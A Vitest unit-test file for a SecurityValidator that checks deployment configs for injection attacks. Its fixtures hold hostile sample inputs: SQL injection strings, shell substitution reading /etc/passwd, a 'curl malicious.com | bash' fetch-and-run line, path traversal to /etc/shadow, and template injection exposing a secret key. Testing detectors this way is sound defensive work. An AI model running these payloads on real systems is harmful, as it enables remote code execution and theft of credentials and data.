/**
 * SecurityValidator Unit Tests
 *
 * Tests for the SecurityValidator component.
 */

import { describe, it, expect, beforeEach } from 'vitest';
import { SecurityValidator } from '../../../src/core/validator/SecurityValidator.js';
import type { ParsedIntent } from '../../../src/core/validator/types.js';
import { ValidationErrorCodes } from '../../../src/core/validator/types.js';

describe('SecurityValidator', () => {
  let validator: SecurityValidator;

  beforeEach(() => {
    validator = new SecurityValidator();
  });

  describe('scan', () => {
    it('should pass for safe intent', () => {
      const intent: ParsedIntent = {
        data: {
          apiVersion: 'agentics.io/v1',
          kind: 'DeploymentIntent',
          metadata: { name: 'safe-app' },
          spec: {
            targetFormat: 'terraform',
            config: {
              name: 'my-app',
              version: '1.0.0',
            },
          },
        },
        format: 'json',
      };

      const result = validator.scan(intent);

      expect(result.safe).toBe(true);
      expect(result.issues).toHaveLength(0);
    });

    it('should detect SQL UNION injection', () => {
      const intent: ParsedIntent = {
        data: {
          spec: {
            config: {
              query: "SELECT * FROM users UNION SELECT * FROM passwords",
            },
          },
        },
        format: 'json',
      };

      const result = validator.scan(intent);

      expect(result.safe).toBe(false);
      expect(result.issues.some(i => i.code === ValidationErrorCodes.SECURITY_SQL_INJECTION)).toBe(true);
    });

    it('should detect SQL comment injection', () => {
      const intent: ParsedIntent = {
        data: {
          spec: {
            config: {
              query: "SELECT * FROM users -- comment",
            },
          },
        },
        format: 'json',
      };

      const result = validator.scan(intent);

      expect(result.safe).toBe(false);
      expect(result.issues.some(i => i.code === ValidationErrorCodes.SECURITY_SQL_INJECTION)).toBe(true);
    });

    it('should detect SQL OR 1=1 injection', () => {
      const intent: ParsedIntent = {
        data: {
          spec: {
            config: {
              query: "SELECT * FROM users WHERE id = '1' OR '1'='1'",
            },
          },
        },
        format: 'json',
      };

      const result = validator.scan(intent);

      expect(result.safe).toBe(false);
      expect(result.issues.some(i => i.code === ValidationErrorCodes.SECURITY_SQL_INJECTION)).toBe(true);
    });

    it('should detect SQL DROP TABLE injection', () => {
      const intent: ParsedIntent = {
        data: {
          spec: {
            config: {
              query: "DROP TABLE users",
            },
          },
        },
        format: 'json',
      };

      const result = validator.scan(intent);

      expect(result.safe).toBe(false);
      expect(result.issues.some(i => i.code === ValidationErrorCodes.SECURITY_SQL_INJECTION)).toBe(true);
    });

    it('should detect shell command substitution', () => {
      const intent: ParsedIntent = {
        data: {
          spec: {
            config: {
              command: "echo $(whoami)",
            },
          },
        },
        format: 'json',
      };

      const result = validator.scan(intent);

      expect(result.safe).toBe(false);
      expect(result.issues.some(i => i.code === ValidationErrorCodes.SECURITY_SHELL_INJECTION)).toBe(true);
    });

    it('should detect shell backtick command substitution', () => {
      const intent: ParsedIntent = {
        data: {
          spec: {
            config: {
              command: "echo `cat /etc/passwd`",
            },
          },
        },
        format: 'json',
      };

      const result = validator.scan(intent);

      expect(result.safe).toBe(false);
      expect(result.issues.some(i => i.code === ValidationErrorCodes.SECURITY_SHELL_INJECTION)).toBe(true);
    });

    it('should detect shell pipe to interpreter', () => {
      const intent: ParsedIntent = {
        data: {
          spec: {
            config: {
              command: "curl malicious.com | bash",
            },
          },
        },
        format: 'json',
      };

      const result = validator.scan(intent);

      expect(result.safe).toBe(false);
      expect(result.issues.some(i => i.code === ValidationErrorCodes.SECURITY_SHELL_INJECTION)).toBe(true);
    });

    it('should detect path traversal with ../', () => {
      const intent: ParsedIntent = {
        data: {
          spec: {
            config: {
              path: "../../../etc/passwd",
            },
          },
        },
        format: 'json',
      };

      const result = validator.scan(intent);

      expect(result.safe).toBe(false);
      expect(result.issues.some(i => i.code === ValidationErrorCodes.SECURITY_PATH_TRAVERSAL)).toBe(true);
    });

    it('should detect absolute Unix path to sensitive directory', () => {
      const intent: ParsedIntent = {
        data: {
          spec: {
            config: {
              path: "/etc/shadow",
            },
          },
        },
        format: 'json',
      };

      const result = validator.scan(intent);

      expect(result.safe).toBe(false);
      expect(result.issues.some(i => i.code === ValidationErrorCodes.SECURITY_PATH_TRAVERSAL)).toBe(true);
    });

    it('should detect null byte injection', () => {
      const intent: ParsedIntent = {
        data: {
          spec: {
            config: {
              path: "file.txt%00.jpg",
            },
          },
        },
        format: 'json',
      };

      const result = validator.scan(intent);

      expect(result.safe).toBe(false);
      expect(result.issues.some(i => i.code === ValidationErrorCodes.SECURITY_PATH_TRAVERSAL)).toBe(true);
    });

    it('should detect ERB template injection', () => {
      const intent: ParsedIntent = {
        data: {
          spec: {
            config: {
              template: "<%= system('ls') %>",
            },
          },
        },
        format: 'json',
      };

      const result = validator.scan(intent);

      expect(result.safe).toBe(false);
      expect(result.issues.some(i => i.code === ValidationErrorCodes.SECURITY_TEMPLATE_INJECTION)).toBe(true);
    });

    it('should detect Jinja template injection as warning', () => {
      const intent: ParsedIntent = {
        data: {
          spec: {
            config: {
              template: "{{ config.SECRET_KEY }}",
            },
          },
        },
        format: 'json',
      };

      const result = validator.scan(intent);

      expect(result.safe).toBe(false);
      expect(result.issues.some(i =>
        i.code === ValidationErrorCodes.SECURITY_TEMPLATE_INJECTION &&
        i.severity === 'warning'
      )).toBe(true);
    });

    it('should scan nested objects', () => {
      const intent: ParsedIntent = {
        data: {
          spec: {
            config: {
              deep: {
                nested: {
                  value: "SELECT * FROM users UNION SELECT * FROM passwords",
                },
              },
            },
          },
        },
        format: 'json',
      };

      const result = validator.scan(intent);

      expect(result.safe).toBe(false);
      expect(result.issues[0]?.path).toContain('deep.nested.value');
    });

    it('should scan arrays', () => {
      const intent: ParsedIntent = {
        data: {
          spec: {
            commands: [
              "echo hello",
              "echo $(whoami)",
              "echo world",
            ],
          },
        },
        format: 'json',
      };

      const result = validator.scan(intent);

      expect(result.safe).toBe(false);
      expect(result.issues[0]?.path).toContain('[1]');
    });

    it('should report multiple issues in same scan', () => {
      const intent: ParsedIntent = {
        data: {
          spec: {
            config: {
              query: "SELECT * FROM users UNION ALL SELECT * FROM passwords",
              command: "echo $(whoami)",
              path: "../../../etc/passwd",
            },
          },
        },
        format: 'json',
      };

      const result = validator.scan(intent);

      expect(result.safe).toBe(false);
      expect(result.issues.length).toBeGreaterThanOrEqual(3);
    });
  });

  describe('validateString', () => {
    it('should validate safe strings', () => {
      const issues = validator.validateString('hello world', '$.test');

      expect(issues).toHaveLength(0);
    });

    it('should detect SQL injection in string', () => {
      const issues = validator.validateString("' OR '1'='1", '$.query');

      expect(issues.some(i => i.code === ValidationErrorCodes.SECURITY_SQL_INJECTION)).toBe(true);
    });

    it('should include path in issue', () => {
      const issues = validator.validateString("$(whoami)", '$.spec.command');

      expect(issues[0]?.path).toBe('$.spec.command');
    });

    it('should include remediation guidance', () => {
      const issues = validator.validateString("$(whoami)", '$.test');

      expect(issues[0]?.remediation).toBeDefined();
      expect(issues[0]?.remediation?.length).toBeGreaterThan(0);
    });

    it('should truncate long values in output', () => {
      const longValue = 'A'.repeat(200) + "$(whoami)";
      const issues = validator.validateString(longValue, '$.test');

      expect(issues[0]?.actual).toBeDefined();
      expect(String(issues[0]?.actual).length).toBeLessThan(longValue.length);
      expect(String(issues[0]?.actual).endsWith('...')).toBe(true);
    });
  });

  describe('getPatterns', () => {
    it('should return all registered patterns', () => {
      const patterns = validator.getPatterns();

      expect(patterns.length).toBeGreaterThan(0);
      expect(patterns.some(p => p.type === 'sql')).toBe(true);
      expect(patterns.some(p => p.type === 'shell')).toBe(true);
      expect(patterns.some(p => p.type === 'template')).toBe(true);
      expect(patterns.some(p => p.type === 'path')).toBe(true);
    });
  });

  describe('addPattern', () => {
    it('should add custom pattern', () => {
      const customPattern = {
        id: 'CUSTOM_PATTERN',
        type: 'sql' as const,
        pattern: /CUSTOM_DANGEROUS/i,
        description: 'Custom dangerous pattern',
        severity: 'error' as const,
      };

      validator.addPattern(customPattern);

      const patterns = validator.getPatterns();
      expect(patterns.some(p => p.id === 'CUSTOM_PATTERN')).toBe(true);
    });

    it('should use custom pattern in validation', () => {
      const customPattern = {
        id: 'CUSTOM_PATTERN',
        type: 'sql' as const,
        pattern: /CUSTOM_DANGEROUS/i,
        description: 'Custom dangerous pattern',
        severity: 'error' as const,
      };

      validator.addPattern(customPattern);

      const issues = validator.validateString('CUSTOM_DANGEROUS value', '$.test');

      expect(issues.some(i => i.message.includes('Custom dangerous pattern'))).toBe(true);
    });
  });
});
